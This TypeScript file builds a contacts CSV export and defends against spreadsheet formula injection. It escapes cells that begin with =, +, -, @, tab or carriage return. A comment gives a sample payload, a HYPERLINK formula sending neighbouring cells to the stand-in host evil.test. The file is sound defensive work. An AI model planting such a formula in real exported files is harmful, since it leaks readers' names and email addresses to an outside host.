/**
 * The contacts CSV, as text.
 *
 * Kept apart from the service so the quoting can be tested without a database and so the route
 * that streams it has nothing to format. RFC 4180: a field is quoted when it carries a comma, a
 * quote, or a line break, and a quote inside a quoted field is doubled. Everything in a row is
 * reader-supplied at some point (a name, an address), so every field goes through the same rule
 * rather than the ones somebody thought were safe. The same rule also defuses a cell a spreadsheet
 * would otherwise run as a formula, because RFC 4180 quoting does not stop Excel evaluating one.
 *
 * Identity follows the plan here exactly as on the page: a redacted row arrives with `name` and
 * `email` already null (the service applies decision 4 before this sees it) and prints as empty
 * cells, never as "Someone", because a spreadsheet cell that says "Someone" is a value someone
 * will sort on.
 */
import type { ContactRow } from "./service";

/** The column order, which is also the header line. */
export const CONTACTS_CSV_COLUMNS = [
  "name",
  "email",
  "domain",
  "verified",
  "first_seen",
  "last_seen",
  "documents_read",
  "projects",
  "visits",
  "tags",
  "last_source",
] as const;

/**
 * The characters a spreadsheet reads as "this cell is a formula, evaluate it".
 *
 * A leading tab or carriage return is in the set because some importers strip leading whitespace
 * before they decide, so `\t=HYPERLINK(...)` is the same cell with a disguise on.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/**
 * One field, quoted only when RFC 4180 says it has to be, and never as a live formula.
 *
 * RFC 4180 has nothing to say about what a spreadsheet does with the text afterwards, and every
 * name and address in this file was typed by a reader on a share link. A name of
 * `=HYPERLINK("https://evil.test/?d="&B2&C2,"Open report")` is a valid CSV field and an
 * exfiltration of the neighbouring address the moment the owner opens the file and clicks. So a
 * value that starts a formula is prefixed with an apostrophe, which every spreadsheet reads as
 * "this is text", and then always quoted, so the apostrophe cannot be mistaken for part of a
 * bare value by a parser that splits on whitespace.
 *
 * The `-` in the set means a negative number would come back as `'-5`. Every numeric cell here is
 * a count that cannot go below zero (`contactCsvCells` below), so nothing is mangled today; a
 * column that can hold a negative belongs outside this rule rather than inside an exception to it.
 */
export function csvField(value: string | number | boolean | null | undefined): string {
  if (value === null || value === undefined) return "";
  const s = typeof value === "string" ? value : String(value);
  if (FORMULA_LEAD.test(s)) return `"'${s.replace(/"/g, '""')}"`;
  if (!/[",\r\n]/.test(s)) return s;
  return `"${s.replace(/"/g, '""')}"`;
}

/** One contact as the cells of a row, in `CONTACTS_CSV_COLUMNS` order. */
export function contactCsvCells(row: ContactRow): string[] {
  return [
    row.name ?? "",
    row.email ?? "",
    row.domain ?? "",
    row.verified ? "true" : "false",
    row.firstSeenAt,
    row.lastSeenAt,
    String(row.documentsRead),
    String(row.projectsCount),
    String(row.visits),
    row.tags.map((t) => t.name).join(", "),
    row.lastSource?.kind ?? "",
  ];
}

/**
 * How many rows a download may carry.
 *
 * The file is streamed a batch at a time, so this is no longer a memory ceiling; it is the point
 * past which a spreadsheet is the wrong answer, and where the export route says so rather than
 * handing back a file that is quietly missing people. It lives here rather than in the service so
 * the page can show the same number without importing anything that talks to a database.
 */
export const CONTACTS_CSV_MAX_ROWS = 25_000;

/** The header line, without its terminator. */
export const CONTACTS_CSV_HEADER = CONTACTS_CSV_COLUMNS.join(",");

/** One contact as a CSV line, without its terminator. */
export function contactCsvLine(row: ContactRow): string {
  return contactCsvCells(row).map(csvField).join(",");
}

/** The whole file: header, then one line per row, CRLF-terminated as the RFC prefers. */
export function contactsToCsv(rows: ReadonlyArray<ContactRow>): string {
  const lines = [CONTACTS_CSV_HEADER];
  for (const row of rows) lines.push(contactCsvLine(row));
  return lines.join("\r\n") + "\r\n";
}
